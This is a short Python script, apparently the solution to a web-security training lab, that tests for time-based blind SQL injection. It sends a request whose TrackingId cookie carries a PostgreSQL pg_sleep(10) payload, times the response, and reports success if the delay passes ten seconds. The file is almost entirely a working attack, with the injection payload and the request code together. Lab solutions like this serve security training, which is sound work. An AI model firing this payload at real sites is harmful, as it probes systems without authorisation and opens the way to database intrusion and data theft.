from ...utils import *

import requests
import time


def solve_lab(url, proxies):
    print_info(
        f'Causing a 10 second delay by visiting "{url} with the following cookies:'
    )
    print('{"TrackingId": "\' || (select 1 from pg_sleep(10)) --"}')

    cookies = {"TrackingId": "' || (select 1 from pg_sleep(10)) --"}
    start = time.perf_counter()
    requests.get(url, proxies=proxies, verify=False, cookies=cookies)
    end = time.perf_counter()

    response_time = end - start
    if response_time > 10:
        print_success(f"Response time: {response_time} seconds\n")
    else:
        print_fail(f"Response time: {response_time} seconds")
